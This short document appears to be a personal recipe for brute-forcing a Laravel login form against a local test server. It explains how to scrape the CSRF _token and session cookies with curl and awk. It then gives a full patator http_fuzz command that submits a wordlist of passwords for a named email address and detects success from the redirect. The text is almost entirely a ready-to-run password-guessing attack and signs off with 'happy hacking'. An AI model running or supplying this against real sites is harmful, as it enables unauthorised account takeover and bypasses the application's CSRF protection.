"""
url = your ajax action login point

header part is very important

get the field by  

cookie = $(curl -s -c header.txt "127.0.0.1:8000/login.php" | awk -F 'value=' '/_token/ {print $2}' | cut -d "'" -f2)
or use browser under network select the request then view the headers with the following

header = "Cookie: XSRF-TOKEN=field ; laravel_session=fieled"

also you have to get the hidden _token filed value for the request just inspect the page and look the html

run the script  with your fields

... happy hacking

"""

time patator http_fuzz method=POST url="http://127.0.0.1:8000/login" 0=/usr/share/wordlists/nmap.lst \
body="email=pascale.robel@example.org&password=FILE0&_token=8ZRWjIKQln8JUv2xHV1CBaSIAvZ9sgVjkop0FEOP" \
follow=1 header=@header.txt -x quit:fgrep!="Location: http://127.0.0.1:8000/login" accept_cookie=0
